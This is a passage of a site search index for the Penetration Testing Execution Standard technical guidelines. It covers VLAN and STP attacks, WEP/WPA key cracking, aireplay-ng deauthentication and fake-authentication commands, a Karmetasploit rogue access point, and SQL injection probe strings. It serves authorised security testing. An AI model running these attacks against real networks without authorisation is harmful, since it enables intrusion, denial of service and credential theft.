(DTP)"},{"location":"pentest_standard/tecguidelines/#spanning-tree-protocol-stp","text":"The Spanning Tree Protocol (STP) is a network protocol that ensures a loop-free topology for any bridged Ethernet local area network. The basic function of STP is to prevent bridge loops and ensuing broadcast radiation. Spanning tree also allows a network design to include spare (redundant) links to provide automatic backup paths if an active link fails, without the danger of bridge loops, or the need for manual enabling/disabling of these backup links. STP is a Data Link Layer protocol. It is standardized as IEEE 802.1D. As the name suggests, it creates a spanning tree within a mesh network of connected layer-2 bridges (typically Ethernet switches), and disables those links that are not part of the spanning tree, leaving a single active path between any two network nodes. The tool for attacking STP is Yersinia. [[:File:Penetration_Testing_Execution_143.png|Screenshot Here]]","title":"Spanning Tree Protocol (STP)"},{"location":"pentest_standard/tecguidelines/#open-shortest-path-first-ospf","text":"Open Shortest Path First (OSPF) is an adaptive routing protocol for Internet Protocol (IP) networks. It uses a link state routing algorithm and falls into the group of interior routing protocols, operating within a single autonomous system (AS). It is defined as OSPF Version 2 in RFC 2328 (1998) for IPv4. The updates for IPv6 are specified as OSPF Version 3 in RFC 5340 (2008).","title":"Open Shortest Path First (OSPF)"},{"location":"pentest_standard/tecguidelines/#rip","text":"RIP is a dynamic routing protocol used in local and wide area networks. As such it is classified as an interior gateway protocol (IGP). It uses the distance-vector routing algorithm. It was first defined in RFC 1058 (1988). The protocol has since been extended several times, resulting in RIP Version 2 (RFC 2453). Both versions are still in use today, although they are considered to have been made technically obsolete by more advanced techniques such as Open Shortest Path First (OSPF) and the OSI protocol IS-IS. RIP has also been adapted for use in IPv6 networks, a standard known as RIPng (RIP next generation) protocol, published in RFC 2080 (1997).","title":"RIP"},{"location":"pentest_standard/tecguidelines/#vlan-hopping","text":"VLAN hopping (virtual local area network hopping) is a computer security exploit, a method of attacking networked file_suport on a VLAN. The basic concept behind all VLAN hopping attacks is for an attacking host on a VLAN to gain access to traffic on other VLANs that would normally not be accessible. There are two primary methods of VLAN hopping: switch spoofing and double tagging. In a switch spoofing attack, an attacking host that is capable of speaking the tagging and trunking protocols used in maintaining a VLAN imitates a trunking switch. Traffic for multiple VLANs is then accessible to the attacking host. In a double tagging attack, an attacking host prepends two VLAN tags to packets that it transmits. The first header (which corresponds to the VLAN that the attacker is really a member of) is stripped off by a first switch the packet encounters, and the packet is then forwarded. The second, false, header is then visible to the second switch that the packet encounters. This false VLAN header indicates that the packet is destined for a host on a second, target VLAN. The packet is then sent to the target host as though it were layer 2 traffic. By this method, the attacking host can bypass layer 3 security measures that are used to logically isolate hosts from one another. The tool for attacking 802.1q is Yersinia. [[:File:Penetration_Testing_Execution_144.png|Screenshot Here]]","title":"VLAN Hopping"},{"location":"pentest_standard/tecguidelines/#vlan-trunking-protocol-vtp","text":"VLAN Trunking Protocol (VTP) is a Cisco proprietary Layer 2 messaging protocol that manages the addition, deletion, and renaming of Virtual Local Area Networks (VLAN) on a network-wide basis. Cisco's VLAN Trunk Protocol reduces administration in a switched network. When a new VLAN is configured on one VTP server, the VLAN is distributed through all switches in the domain. This reduces the need to configure the same VLAN everywhere. To do this, VTP carries VLAN information to all the switches in a VTP domain. VTP advertisements can be sent over ISL, 802.1q, IEEE 802.10 and LANE trunks. VTP is available on most of the Cisco Catalyst Family products. The tool for attacking VTP is Yersinia. [[:File:Penetration_Testing_Execution_145.png|Screenshot Here]]","title":"VLAN Trunking Protocol (VTP)"},{"location":"pentest_standard/tecguidelines/#rf-access","text":"The goal of the earlier phases is to gather every possible piece of information about the Radio Frequencies in use that can be leveraged during this phase.","title":"RF Access"},{"location":"pentest_standard/tecguidelines/#unencrypted-wireless-lan","text":"It is possible to actually connect to an unencrypted Wireless LAN (WLAN). To connect to an unencrypted WLAN, you simply have to either issue appropriate commands or use a GUI interface to connect.","title":"Unencrypted Wireless LAN"},{"location":"pentest_standard/tecguidelines/#iwconfig-linux","text":"The following commands to connect up to the ESSID. To ensure that the wireless interface is down, issue the following: ifconfig < interface > down Force dhclient to release any currently assigned DHCP addresses with the following command: dhclient -r < interface > Bring the interface back up with the following command: ifconfig < interface > up Iwconfig is similar to ifconfig, but is dedicated to the wireless interfaces. It is used to set the parameters of the network interface which are specific to the wireless operation. To assign set the ESSID (or Network Name to the wireless interface, use the following command: iwconfig < interface > essid \"ESSID_IN_QUOTES\" Next we need to set the operating mode of the device, which depends on the network topology. Setting this to ''Managed'' means that we are connecting to a network that is composed of access points. iwconfig < interface > mode Managed Use dhclient to obtain a DHCP addresses with the following command: dhclient < interface > At this point we should receive an IP address and be connected to the client's wireless network. Ensure that adequate screen shots are taken to definitively indicate the ability to connect, receive an IP address, and traverse the network.","title":"Iwconfig (Linux)"},{"location":"pentest_standard/tecguidelines/#windows-xp7_1","text":"Based upon the wireless network adapter installed, Windows will provide you with a mechanism to connect to wireless networks. The version of Windows utilized will dictate the process. For this reason we are covering Windows XP and 7. [[:File:Penetration_Testing_Execution_146.png|Screenshot Here]] Windows XP will show an icon with a notification that says it has found wireless networks. [[:File:Penetration_Testing_Execution_147.png|Screenshot Here]] Right-click the wireless network icon in the lower right corner of your screen, and then click \"View Available Wireless Networks.\" [[:File:Penetration_Testing_Execution_148.png|Screenshot Here]] The Wireless Network Connection window appears and displays your wireless network listed with the SSID you chose. If you don't see your network, click Refresh network list in the upper left corner. Click your network, and then click Connect in the lower right corner. Windows 7 offers the same ability to connect to wireless networks. On the right side of the taskbar, you will see a wireless network icon like the one below. Click on it. [[:File:Penetration_Testing_Execution_149.png|Screenshot Here]] A window with available network connections will open. As you can see from the screenshot below, the list is split by the type of available network connections. At the top you have [ http://en.wikipedia.org/wiki/Dial-up dial-up] and [ http://en.wikipedia.org/wiki/VPN virtual private network (VPN)] connections, while at the bottom you have a list of all the wireless networks which Windows 7 has detected. To refresh the list of available networks, click on the button highlighted in the screenshot below. [[:File:Penetration_Testing_Execution_150.png|Screenshot Here]] You can scroll down through the list of available networks. Once you decided on which network to connect to, click on it. Next, click on the ''Connect'' button. [[:File:Penetration_Testing_Execution_151.png|Screenshot Here]] If everything is OK, Windows 7 will connect to the network you selected using the given security key.","title":"Windows (XP/7)"},{"location":"pentest_standard/tecguidelines/#attacking-the-access-point","text":"All identified access points are vulnerable to numerous attacks. For completeness, we've included some attack methods that may not be a part of all engagements. Ensure that the scoping is reviewed prior to initiating any attacks.","title":"Attacking the Access Point"},{"location":"pentest_standard/tecguidelines/#denial-of-service-dos","text":"Within the standard, there are two packets that help in this regard, the ''Clear To Send (CTS)'' and ''Request To Send (RTS)'' packets. Devices use RTS packets when they have something big to send, and they don't want other devices to step on their transmission. CTS packets are sent so that the device knows it's okay to transmit. Every device (other than the one that sent the RTS) within the range of the CTS packet cannot transmit anything for the duration specified. The first technique is to transmit the CTS packets, meaning that anyone in range of your signal will be unable to transmit. This requires a high-gain Omni-directional antenna to a much greater impact. The second technique is to send an RTS packet to the AP you are targeting. Once the AP gets the RTS packet, it will send the CTS. A highly directional antenna from a distance can be used to target the AP with an RTS packet. Generally speaking, transmitting the CTS has a greater impact.","title":"Denial of Service (DoS)"},{"location":"pentest_standard/tecguidelines/#cracking-passwords","text":"","title":"Cracking Passwords"},{"location":"pentest_standard/tecguidelines/#wpa-psk-wpa2-psk","text":"WPA-PSK is vulnerable to brute force attack. Tools like Aircrack and coWPAtty take advantage of this weakness and provided a way to test keys against dictionaries. The problem is that it's a very slow process. Precomputational attacks are limited as the BSSID and the BSSID length are seeded into the passphrase hash. This is why WPA-PSK attacks are generally limited due by time. There is no difference between cracking WPA or WPA2, the authentication is essentially the same. The main requirement for any WPA/WPA2 is to capture the authentication handshake and then use Aircrack-ng to crack the pre-shared key. This can be done either actively or passively. \"Actively\" means you will accelerate the process by deauthenticating an existing wireless client. \"Passively\" means you simply wait for a wireless client to authenticate to the WPA/WPA2 network.","title":"WPA-PSK/ WPA2-PSK"},{"location":"pentest_standard/tecguidelines/#wpawpa2-enterprise","text":"In environments with a large number of users, such as corporations or universities, WPA/WPA2 pre-shared key management is not feasible. For example, it wouldn't be possible to track which users are connected and it would be impossible to revoke access to the network for individuals without changing the key for everyone. Therefore WPA2 Enterprise authenticates users against a user database (RADIUS). Two common methods to do that are WPA2-EAP-TTLS and WPA2-PEAP.","title":"WPA/WPA2-Enterprise"},{"location":"pentest_standard/tecguidelines/#attacks","text":"","title":"Attacks"},{"location":"pentest_standard/tecguidelines/#leap","text":"This stands for the Lightweight Extensible Authentication Protocol. This protocol is based on 802.1X and helps minimize the original security flaws by using WEP and a sophisticated key management system. This EAP-version is safer than EAP-MD5. This also uses MAC address authentication. LEAP is not safe against crackers. THC-LeapCracker can be used to break Cisco's version of LEAP and be used against computers connected to an access point in the form of a dictionary attack. Anwrap and asleap are other crackers capable of breaking LEAP.","title":"LEAP"},{"location":"pentest_standard/tecguidelines/#asleap","text":"Asleap is a designed specifically to recover weak LEAP (Cisco's Lightweight Extensible Authentication Protocol) and PPTP passwords. Asleap performs Weak LEAP and PPTP password recovery from pcap and AiroPeek files or from live capture. Finally, it has the ability to deauthenticate clients on a leap WLAN (speeding up leap password recovery). [[:File:Penetration_Testing_Execution_152.png|Screenshot Here]] The first step involved in the use of asleap is to produce the necessary database (.dat) and index files (.idx) using genkeys from the supplied (-r) a dictionary (wordlist) file. [[:File:Penetration_Testing_Execution_153.png|Screenshot Here]] The final step in recovering the weak LEAP password is to run the asleap command with our newly created .dat and .idx files: [[:File:Penetration_Testing_Execution_154.png|Screenshot Here]]","title":"Asleap"},{"location":"pentest_standard/tecguidelines/#8021x","text":"802.1X is an IEEE Standard for port-based Network Access Control (PNAC). It is part of the IEEE 802.1 group of networking protocols. It provides an authentication mechanism to devices wishing to attach to a LAN or WLAN. IEEE 802.1X defines the encapsulation of the Extensible Authentication Protocol (EAP) over IEEE 802 which is known as \"EAP over LAN\" or EAPOL. There are two main attacks which can be used against 802.1X:","title":"802.1X"},{"location":"pentest_standard/tecguidelines/#key-distribution-attack","text":"The key distribution attack exploits a weakness in the RADIUS protocol. The key distribution attack relies on an attacker capturing the PMK transmission between the RADIUS server and the AP. As the PMK is transmitted outside of the TLS tunnel, its protection is solely reliant on the RADIUS server's HMAC-MD5 hashing algorithm. Should an attacker be able to leverage a man-in-the-middle attack between the AP and RADIUS sever, a brute-force attempt could be made to crack the RADIUS shared secret. This would ultimately provide the attacker with access to the PMK - allowing full decryption of all traffic between the AP and supplicant.","title":"Key Distribution Attack"},{"location":"pentest_standard/tecguidelines/#radius-impersonation-attack","text":"The RADIUS impersonation attack relies on users being left with the decision to trust or reject certificates from the authenticator. Attackers can exploit this deployment weakness by impersonating the target network's AP service set identifier (SSID) and RADIUS server. Once both the RADIUS server and AP have been impersonated the attacker can issue a 'fake' certificate to the authenticating user. After the certificate has been accepted by the user the client will proceed to authenticate via the inner authentication mechanism. This allows the attacker to capture the MSCHAPv2 challenge/response and attempt to crack it offline.","title":"RADIUS Impersonation Attack"},{"location":"pentest_standard/tecguidelines/#peap","text":"The Protected Extensible Authentication Protocol (Protected EAP or PEAP) is a protocol that encapsulates the Extensible Authentication Protocol (EAP) within an encrypted and authenticated Transport Layer Security (TLS) tunnel. The purpose was to correct deficiencies in EAP; EAP assumed a protected communication channel, such as that provided by physical security, so facilities for protection of the EAP conversation were not provided.","title":"PEAP"},{"location":"pentest_standard/tecguidelines/#radius-impersonation-attack_1","text":"The RADIUS impersonation attack relies on users being left with the decision to trust or reject certificates from the authenticator. Attackers can exploit this deployment weakness by impersonating the target network's AP service set identifier (SSID) and RADIUS server. Once both the RADIUS server and AP have been impersonated the attacker can issue a 'fake' certificate to the authenticating user. After the certificate has been accepted by the user the client will proceed to authenticate via the inner authentication mechanism. This allows the attacker to capture the MSCHAPv2 challenge/response and attempt to crack it offline.","title":"RADIUS Impersonation Attack"},{"location":"pentest_standard/tecguidelines/#authentication-attack","text":"The PEAP authentication attack is a primitive means of gaining unauthorized access to PEAP networks. By sniffing usernames from the initial (unprotected) PEAP identity exchange an attacker can attempt to authenticate to the target network by 'guessing' user passwords. This attack is often ineffective as the authenticator will silently ignores bad login attempts ensuring a several second delay exists between login attempts.","title":"Authentication Attack"},{"location":"pentest_standard/tecguidelines/#eap-fast","text":"EAP-FAST (Flexible Authentication via Secure Tunneling) is Cisco's replacement for LEAP. The protocol was designed to address the weaknesses of LEAP while preserving the \"lightweight\" implementation. EAP-FAST uses a Protected Access Credential (PAC) to establish a TLS tunnel in which client credentials are verified. EAP-FAST provides better protection against dictionary attacks, but is vulnerable to MITM attacks. Since many implementations of EAP-FAST leave anonymous provisioning enabled, AP impersonation can reveal weak credential exchanges.","title":"EAP-Fast"},{"location":"pentest_standard/tecguidelines/#wepwpawpa2","text":"The core process of connecting to a WEP encrypted network revolves around obtaining the WEP key for the purpose of connecting to the network. There are several tools that can be used to perform attacks against WEP.","title":"WEP/WPA/WPA2"},{"location":"pentest_standard/tecguidelines/#aircrack-ng","text":"Aircrack-ng is an 802.11 WEP and WPA-PSK keys cracking program that can recover keys once enough data packets have been captured. It implements the standard FMS attack along with some optimizations like KoreK attacks, as well as the all-new PTW attack, thus making the attack much faster compared to other WEP cracking tools. The first step is to place the wireless interface in monitor mode by entering: airmon-ng start wlan0 '''Airmon-ng''' Airmon-ng is used to enable monitor mode on wireless interfaces. It may also be used to go back from monitor mode to managed mode. Entering the airmon-ng command without parameters will show the interfaces status. To start wlan0 in monitor mode: airmon-ng start wlan0 To start wlan0 in monitor mode on channel 8: airmon-ng start wlan0 8 To stop wlan0: airmon-ng stop wlan0 To check the status: airmon-ng [[:File:Penetration_Testing_Execution_155.png|Screenshot Here]] Enter \"iwconfig\" to validate the wireless interfaces. The output should look similar to: [[:File:Penetration_Testing_Execution_156.png|Screenshot Here]] '''Airodump-ng''' Airodump-ng is used for packet capturing of raw 802.11 frames and is particularly suitable for collecting WEP IVs (Initialization Vector) for the intent of using them with Aircrack-ng. If you have a GPS receiver connected to the computer, Airodump-ng is capable of logging the coordinates of the found access points. Usage: airodump-ng < options > < interface >[ , < interface > ,... ] Options: --ivs : Save only captured IVs --gpsd : Use GPSd --write < prefix > : Dump file prefix -w : same as --write --beacons : Record all beacons in dump file --update < secs > : Display update delay in seconds --showack : Prints ack/cts/rts statistics -h : Hides known stations for --showack -f < msecs > : Time in ms between hopping channels --berlin < secs > : Time before removing the AP/client from the screen when no more packets are received (Default: 120 seconds) -r < file > : Read packets from that file -x < msecs > : Active Scanning Simulation --output-format < formats > : Output format. Possible values: pcap, ivs, csv, gps, kismet, netxml Short format \"-o\" The option can be specified multiple times. In this case, each file format specified will be output. Only ivs or pcap can be used, not both. [[:File:Penetration_Testing_Execution_157.png|Screenshot Here]] [[:File:Penetration_Testing_Execution_158.png|Screenshot Here]] '''Aireplay-ng''' Aireplay-ng is primarily used to generate or accelerate traffic for the later use with Aircrack-ng (for cracking WEP keys). Aireplay-ng supports various attacks such as deauthentication, fake authentication, Interactive packet replay, hand-crafted ARP request injection and ARP-request re injection. Usage: aireplay-ng < options > < replay interface > These are the attack names and their corresponding \"numbers\": '''Attack 0: '''Deauthentication '''Attack 1: '''Fake authentication '''Attack 2: '''Interactive packet replay '''Attack 3: '''ARP request replay attack '''Attack 4: '''KoreK chopchop attack '''Attack 5: '''Fragmentation attack '''Attack 9: '''Injection test Note: Not all options apply to all attacks. '''Attack 0 - Deauthentication''' A deauthentication attack sends disassociation packets to one or more clients who are currently associated with an AP. Disassociating clients can reveal a hidden / cloaked ESSID. Deauthentication attacks also provide an ability to capture WPA/WPA2 handshakes by forcing clients to re-authenticate. aireplay-ng -0 1 -a 34:EF:44:BB:14:C1 -c 00:E0:4C:6D:27:8D wlan0 -0 means deauthentication 1 is the number of deauths to send (you can send multiple if you wish); 0 means send them continuously -a 34:EF:44:BB:14:C1 is the MAC address of the access point -c 00:E0:4C:6D:27:8D is the MAC address of the client to deauthenticate; if this is omitted then all clients are deauthenticated wlan0 is the interface name [[:File:Penetration_Testing_Execution_159.png|Screenshot Here]] '''Attack 1 - Fake authentication''' The fake authentication attack allows you to perform the two types of WEP authentication (Open System and Shared Key) and to associate with an AP. This attack is useful in scenarios where there are no associated clients. Note that fake authentication attacks do not generate ARP packets. aireplay-ng -1 0 -e 2WIRE696 -a 34:EF:44:BB:14:C1 -h 00:E0:4C:6D:27:8D wlan0 -1 means fake authentication 0 reassociation timing in seconds -e 2WIRE696 is the wireless network name -a 34:EF:44:BB:14:C1 is the access point MAC address -h 00:E0:4C:6D:27:8D is our card MAC address wlan0 is the wireless interface name [[:File:Penetration_Testing_Execution_160.png|Screenshot Here]] '''Attack 3 - ARP Request Replay Attack''' The classic ARP request replay attack is the most effective way to generate new initialization vectors. This attack is probably the most reliable of all. The program listens for an ARP packet then retransmits it back to the AP. This, in turn causes the AP to repeat the ARP packet with a new IV. The program retransmits the same ARP packet over and over. However, each ARP packet repeated by the AP has a new IV. The collection of these IVs will later help us later in determining the WEP key. aireplay-ng -3 -b 34:EF:44:BB:14:C1 -h 00:E0:4C:6D:27:8D wlan0 -3 means standard arp request replay -b 34:EF:44:BB:14:C1 is the access point MAC address -h 00:E0:4C:6D:27:8D is the source MAC address (either an associated client or from fake authentication) wlan0 is the wireless interface name '''Attack 4 - KoreK chopchop''' The KoreK chopchop attack can decrypt a WEP data packet without knowing the key. It can even work against dynamic WEP. ''This attack does not recover the WEP key itself, it merely reveals the plaintext''. Some APs are not vulnerable to this attack. They may seem vulnerable at first but actually drop data packets shorter than 60 bytes. If the AP drops packets shorter than 42 bytes, Aireplay tries to guess the rest of the missing data, as far as the headers are predictable. If an IP packet is captured Aireplay checks if the checksum of the header is correct after guessing its missing parts. Remember that this attack requires at least one WEP data packet. aireplay-ng -4 -b 34:EF:44:BB:14:C1 -h 00:E0:4C:6D:27:8D wlan0 -4 means the chopchop attack -b 34:EF:44:BB:14:C1 is the access point MAC address -h 00:E0:4C:6D:27:8D is the source MAC address (either an associated client or from fake authentication) wlan0 is the wireless interface name '''Attack 5 - Fragmentation Attack''' The fragmentation attack does not recover the WEP key itself, but (also) obtains the PRGA (pseudo random generation algorithm) of the packet. The PRGA can then be used to generate packets with Packetforge-ng which are in turn are used for various injection attacks. The attack requires at least one data packet to be received from the AP in order to initiate the attack. Basically, the program obtains a small amount of keying material from the packet then attempts to send ARP and/or LLC packets with known content to the AP. If the packet is successfully echoed back by the AP then a larger amount of keying information can be obtained from the returned packet. This cycle is repeated several times until 1500 bytes of PRGA are obtained (sometimes less than 1500 bytes). aireplay-ng -5 -b 34:EF:44:BB:14:C1 -h 00:E0:4C:6D:27:8D wlan0 -5 means run the fragmentation attack -b 34:EF:44:BB:14:C1 is the access point MAC address -h 00:E0:4C:6D:27:8D is the source MAC address (either an associated client or from fake authentication) wlan0 is the wireless interface name '''Attack 9: Injection test''' The injection test determines if your card can successfully inject wireless packets, and measures ping response times to APs. If you have two wireless cards connected, the test can also determine which specific injection attacks can be successfully executed. The basic injection test lists the APs in the area which respond to broadcast probes, and for each it performs a 30 packet test which measures the connection quality. This connection quality quantifies the ability of your card to successfully send and receive a response to the test target. The percentage of responses received gives a good indication of the link quality. aireplay-ng -9 wlan0 Where: -9 - Injection test. wlan0 - the interface name [[:File:Penetration_Testing_Execution_161.png|Screenshot Here]] '''Aircrack-ng''' Aircrack-ng is an 802.11 WEP and WPA/WPA2-PSK key cracking program. Aircrack-ng can recover the WEP key once enough encrypted packets have been captured with airodump-ng. This part of the Aircrack-ng suite determines the WEP key using two fundamental methods. The first method is via the PTW approach (Pyshkin, Tews, and Weinmann). The default cracking method is PTW. For cracking WPA/WPA2 pre-shared keys, only a dictionary method is used. SSE2 support is included to dramatically speed up WPA/WPA2 key processing. A \"four-way handshake\" is required as input. For WPA handshakes, a full handshake is composed of four packets. However, Aircrack-ng is able to work successfully with just 2 packets. EAPOL packets (2 and 3) or packets (3 and 4) are considered a full handshake.","title":"Aircrack-ng"},{"location":"pentest_standard/tecguidelines/#attacking-the-user","text":"The Rules of Engagment (ROE) should be validated to ensure this is in-scope before conducting any attacks against the users","title":"Attacking the User"},{"location":"pentest_standard/tecguidelines/#karmetasploit-attacks","text":"Karmetasploit is a modification of the KARMA to integrate it into Metasploit. Karmetasploit creates a working \"evil\" access point working that provides network services to an unsuspecting user. The services Karmetasploit provides include a DNS daemon that responds to all requests, a POP3 service, an IMAP4 service, a SMTP service, a FTP service, a couple of different SMB services, and a web service. All DNS lookups result in the IP address of the access point being returned, resulting in a blackhole effect for all email, web, and other network traffic. To run Karmetasploit, use aireplay-ng to verify that injection is functioning: # aireplay-ng --test [monitor-interface] The output of aireplay-ng should indicate that injection is working and that one of the local access points could be reached. If every access point returns 0% and the message indicating injection is working is not there, you likely need to use a different/patched driver or a different wireless card. The Metasploit Framework does not have a DHCP module, so a third-party DHCP service must be configured and installed. The easiest way to accomplish this is by installed the \"dhcpd\" package. On Backtrack 4 R2, the package is called \"dhcpd3\"or on Backtrack 5, the package is called \"dhcp3-server\". apt-get install dhcp3-server Once the DHCP server has been installed, an appropriate configuration file needs to be created. This file is normally called \"dhcpd.conf\" or \"dhcpd3.conf\" and resides in /etc, /etc/dhcp, or /etc/dhcp3. The example below uses the 10.0.0.0/24 network with the access point configured at 10.0.0.1. default-lease-time 60; max-lease-time 72; ddns-update-style none; authoritative; log-facility local7; subnet 10.0.0.0 netmask 255.255.255.0 { range 10.0.0.100 10.0.0.254; option routers 10.0.0.1; option domain-name-servers 10.0.0.1; } To run Karmetasploit, there are three things that need to happen. First, airbase-ng must be started and configured as a greedy wireless access point. The following example will beacon the ESSID of the target company, respond to all probe requests, and rebroadcast all probes as beacons for 30 seconds: airbase-ng -P -C 30 -e \" \" -v [monitor-interface] Second, we need to configure the IP address of the at0 interface to match. ifconfig at0 up 10.0.0.1 netmask 255.255.255.0 Third, the DHCP server needs to be started on the \"at0\" TUN/TAP interface created by airbase-ng: dhcpd -cf /etc/dhcpd.conf at0 Finally, the Metasploit Framework itself needs to be configured. While its possible to configure each service by hand, its more efficient to use a resource file with the msfconsole interface. A sample resource file, configured to use 10.0.0.1 as the access point address, with nearly every feature enabled, can be downloaded here [ http://digitaloffense.net/tools/karma.rc ]. To use this resource file, run msfconsole with the -r parameter. Keep in mind that msfconsole must be run as root for the capture services to function. msfconsole -r karma.rc Once the Metasploit Framework processes the commands in the resource file, the standard msfconsole shell will be available for commands. As clients connect to the access point and try to access the network, the service modules will do what they can to extract information from the client and exploit browser vulnerabilities.","title":"Karmetasploit Attacks"},{"location":"pentest_standard/tecguidelines/#dns-requests","text":"< Contribution Needed >","title":"DNS Requests"},{"location":"pentest_standard/tecguidelines/#bluetooth","text":"< Contribution Needed >","title":"Bluetooth"},{"location":"pentest_standard/tecguidelines/#personalized-rogue-ap","text":"< Contribution Needed > DoS / Blackmail angle","title":"Personalized Rogue AP"},{"location":"pentest_standard/tecguidelines/#web","text":"A web application involves a web server that accepts input and is most often interfaced using http(s). The penetration tester\u2019s goal is to discover any interaction points that can be manipulated to access information, functionality or services beyond the web applications intended use. Quite often a web application will comprise of tiers. The tiers are generally broken up into web, application, and data. These tiers can run on one or more servers, and any of the tiers may be load balanced across multiple servers. In the quest to find all the entry points, during the intelligence gathering and vulnerability analysis phase the penetration tester will utilize mostly GET and POST requests but should also test head, put, delete, trace, options, connect and patch. The objective is to map all input and output points. These are not limited to simply forms on a page, but include cookies, links, hidden forms, http parameters, etc. During the exploration particular attention should be given to sessions, cookies, error pages, http status codes, indirectly accessible pages, encryption usage and server configuration, dns and proxy cache usage. Ideally, this will be done using both automated and manual methods to discover potential ways to manipulate the web application parameters or logic. This is generally done using some form of client application (browser) and a proxy that can sit between the client application and the web application, and a tool to crawl (aka spider) through page links.","title":"Web"},{"location":"pentest_standard/tecguidelines/#sql-injection-sqli","text":"According to OWASP ( https://www.owasp.org/index.php/SQL_Injection ) SQL Injection, or as it is more commonly known SQLi, consists of insertion or \"injection\" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands. SQL (Structured Query Language) is an interpretted programming language for interfacing with a database. It is sometimes also lazily used to refer to the database management system. Applications utilize a database to store/retrieve and process information. The database is usually a relational database, where data is stored in one more tables, each table has values in one or more columns (data types/attributes) and rows (element/tuple). There are several implementations of SQL and each has their own commands and syntax. A few common commands are: select - retrieve data union - combine results of two or more selects insert - add new data update - modify existing data delete - delete data What is injection? Simply stated, SQL injection exploits a vulnerability that allows data sent to an application to be interpreted and run as SQL commands. According to OWASP ( https://www.owasp.org/index.php/SQL_Injection ) SQL Injection, also known as SQLi, consists of insertion or \"injection\" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands. SQL injection is typically discovered in the Vulnerability Analysis phase (and maybe hinted at in the intelligence gathering phase) of the engagement. One possible way to test for sql injection is to enter a ' into input fields then compare the application response to a well formed request. If the web application is vulnerable to SQLi, a ' may return different results when the SQL statement attempts to execute. Was an error message returned, different results, web page a different size, are different HTTP codes returned. Don't forget to look at the source, not just what is displayed in the browser. Depending on the reaction, it may be necessary to use other tests for injection, for example \" or '; or ) or '+\"#' or %27%20or%201#1. It may also be necessary to encode the characters to bypass filters. If the access to the source code of the application is available, review for any variables where input can be manipulated as part of the application usage. In some cases this will be readily apparent, for instance php sql # \"SELECT * from [table] WHERE tuple # ' sql # \"SELECT * from [table] WHERE tuple # ' _GET(\"input\"]'\"; c# $sql # \"SELECT * from [table] WHERE tuple # '\" + request.getParameter(\"input\") # \"'\"; Several tools are available for the identification and exploitation of SQLi Several tools are available for the identification and exploitation of SQLi. SQLi Tools *Havij ( http://itsecteam.com/en/projects/project1.htm ) *SQLmap ( http://sqlmap.sourceforge.net ) *The Mole ( http://sourceforge.net/projects/themole ) *Pangolin ( http://nosec.org/en/productservice/pangolin )","title":"SQL Injection (SQLi)"},{"location":"pentest_standard/tecguidelines/#xss","text":"< Contribution Needed >","title":"XSS"},{"location":"pentest_standard/tecguidelines/#csrf","text":"< Contribution Needed >","title":"CSRF"},{"location":"pentest_standard/tecguidelines/#ad-hoc-networks","text":"< Contribution Needed > Information Leakage","title":"Ad-Hoc Networks"},{"location":"pentest_standard/tecguidelines/#detection-bypass","text":"< Contribution Needed > FW/WAF/IDS/IPS Evasion Human Evasion DLP Evasion","title":"Detection bypass"},{"location":"pentest_standard/tecguidelines/#resistance-of-controls-to-attacks","text":"< Contribution Needed >","title":"Resistance of Controls to attacks"},{"location":"pentest_standard/tecguidelines/#type-of-attack","text":"< Contribution Needed > Client Side Phishing (w/pretext) Service Side Out of band Post-Exploitation Infrastructure analysis","title":"Type of Attack"},{"location":"pentest_standard/tecguidelines/#the-social-engineer-toolkit","text":"The Social-Engineering Toolkit (SET) is a python-driven suite of custom tools which solely focuses on attacking the human element of pentesting. It\u2019s main purpose is to augment and simulate social-engineering attacks and allow the tester to effectively test how a targeted attack may succeed. Currently SET has two main methods of attack, one is utilizing Metasploit payloads and Java-based attacks by setting up a malicious website (which you can clone whatever one you want) that ultimately delivers your payload. The second method is through file-format bugs and e-mail phishing. The second method supports your own open-mail relay, a customized sendmail open-relay, or Gmail integration to deliver your payloads through e-mail. The goal of SET is to bring awareness to the often forgotten attack vector of social-engineering. You can see detailed [ http://www.secmaniac.com/tutorials/ tutorials here] or by downloading the [ http://svn.secmaniac.com/social_engineering_toolkit/readme/User_Manual.pdf user manual here].","title":"The Social-Engineer Toolkit"},{"location":"pentest_standard/tecguidelines/#vpn-detection","text":"VPN Hunter ( http://www.vpnhunter.com ) discovers and classifies SSL VPNs from top vendors including Juniper, Cisco, Palo Alto, Citrix, Fortinet, F5, SonicWALL, Barracuda, Microsoft, and Array. VPN Hunter will also attempt to detect whether two-factor authentication is enabled on the target SSL VPNs.","title":"VPN detection"},{"location":"pentest_standard/tecguidelines/#route-detection-including-static-routes","text":"< Contribution Needed >","title":"Route detection, including static routes"},{"location":"pentest_standard/tecguidelines/#network-protocols-in-use","text":"< Contribution Needed >","title":"Network Protocols in use"},{"location":"pentest_standard/tecguidelines/#proxies-in-use","text":"< Contribution Needed > * Network Level * Application Level","title":"Proxies in use"},{"location":"pentest_standard/tecguidelines/#network-layout","text":"< Contribution Needed > Mapping connectivity in/out of every segment Lateral connectivity","title":"Network layout"},{"location":"pentest_standard/tecguidelines/#high-valueprofile-targets","text":"< Contribution Needed >","title":"High value/profile targets"},{"location":"pentest_standard/tecguidelines/#pillaging","text":"< Contribution Needed >","title":"Pillaging"},{"location":"pentest_standard/tecguidelines/#video-cameras","text":"< Contribution Needed >","title":"Video Cameras"},{"location":"pentest_standard/tecguidelines/#data-exfiltration","text":"< Contribution Needed > identify web servers identify ftp servers DNS and ICMP tunnels VoIP channels Physical channels (printing, garbage disposal, courier) Fax (on multifunction printers)","title":"Data Exfiltration"},{"location":"pentest_standard/tecguidelines/#locating-shares","text":"< Contribution Needed >","title":"Locating Shares"},{"location":"pentest_standard/tecguidelines/#audio-capture","text":"< Contribution Needed > VoIP Microphone","title":"Audio Capture"},{"location":"pentest_standard/tecguidelines/#high-value-files","text":"< Contribution Needed >","title":"High Value Files"},{"location":"pentest_standard/tecguidelines/#database-enumeration","text":"< Contribution Needed > Checking for PPI card data passwords/user accounts","title":"Database Enumeration"},{"location":"pentest_standard/tecguidelines/#wifi","text":"< Contribution Needed > Steal wifi keys Add new Wifi entries with higher preference then setup AP to force connection Check 